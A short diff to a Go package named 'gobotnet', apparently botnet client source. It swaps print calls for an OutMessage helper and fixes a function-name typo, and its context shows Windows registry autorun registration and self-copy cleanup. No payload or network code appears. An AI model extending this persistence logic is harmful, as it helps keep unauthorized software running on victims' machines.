@@ -1,7 +1,6 @@
 package gobotnet
 
 import (
-	"fmt"
 	"golang.org/x/sys/windows/registry"
 	"os"
 )
@@ -16,8 +15,8 @@ var (
 )
 
 func RegistrationTest() {
-	fmt.Println("Test Registration Start")
-	fmt.Println("Test Registration End")
+	OutMessage("Test Registration Start")
+	OutMessage("Test Registration End")
 }
 
 func RegisterProgram() {
@@ -29,7 +28,7 @@ func RegisterProgram() {
 func UnRegisterProgram() {
 	UnRegisterAutoRun()
 	DeleteFile(sourceExecFilePath)
-	RemoveDirWithContet(copyProgramDir)
+	RemoveDirWithContent(copyProgramDir)
 }
 
 func RegisterAutoRun() error {
